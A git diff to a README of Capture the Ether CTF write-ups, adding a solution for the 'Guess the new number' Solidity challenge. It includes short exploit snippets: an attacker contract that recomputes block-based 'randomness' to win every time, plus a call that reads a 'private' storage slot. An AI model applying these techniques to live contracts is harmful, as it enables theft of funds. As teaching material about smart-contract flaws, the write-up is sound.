@@ -79,7 +79,7 @@ const tx = await contract.guess(42, { value: utils.parseEther("1") });
 
 The answer `n` is now a number that produces a specific `answerHash` which is not reversible
 
-```typescript
+```solidity
 bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;
 
 function guess(uint8 n) public payable {
@@ -110,14 +110,15 @@ for (let i = 0; i <= 255; i++) {
 
 In this case the answer is generated "randomly" and stored "privately" in the contract:
 
-```typescript
+```solidity
 contract GuessTheRandomNumberChallenge {
-    uint8 answer;
+  uint8 answer;
 
-    function GuessTheRandomNumberChallenge() public payable {
-        answer = uint8(keccak256(block.blockhash(block.number - 1), now));
-    }
+  function GuessTheRandomNumberChallenge() public payable {
+    answer = uint8(keccak256(block.blockhash(block.number - 1), now));
+  }
 }
+
 ```
 
 Data in smart contracts can be read despite being declared as "private". The key here is to understand how the storage works, and that the `answer` is stored in `slot 0` and therefore can be retrieved by calling:
@@ -129,6 +130,28 @@ const secretNumber = await contract.provider.getStorageAt(contract.address, 0);
 [Script](./scripts/lotteries/GuessTheRandomNumberChallenge.ts) | [Test](./test/lotteries/GuessTheRandomNumberChallenge.spec.ts)
 
 ### Guess the new number
+
+The answer is now a "random" number:
+
+```solidity
+function guess(uint8 n) public payable {
+  uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
+
+  if (n == answer) {
+    msg.sender.transfer(2 ether);
+  }
+}
+
+```
+
+The EVM is deterministic, so it is not possible to achieve randomness inside it. Given the same inputs, it will output the same result, and we can explot this.
+
+We can create a new contract that calculates the answer and calls the original contract with it. That way we can make sure that the "random" number is generated on the same block, and we can win every time.
+
+```solidity
+uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
+challenge.guess.value(1 ether)(answer);
+```
 
 [Script](./scripts/lotteries/GuessTheNewNumberChallenge.ts) | [Test](./test/lotteries/GuessTheNewNumberChallenge.spec.ts)
 
